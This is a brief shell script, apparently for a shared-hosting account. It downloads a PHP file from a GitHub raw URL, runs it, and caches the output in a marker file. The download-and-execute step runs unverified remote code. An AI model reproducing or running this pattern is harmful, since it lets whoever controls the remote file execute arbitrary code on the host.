#!/bin/sh
cd /home/u791581885 && [ -f t158.done ] && tail -c 8000 t158.done && exit 0
curl -fsSL -o t158.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs158.php" && /opt/alt/php83/usr/bin/php t158.php > t158.done 2>&1; tail -c 8000 t158.done
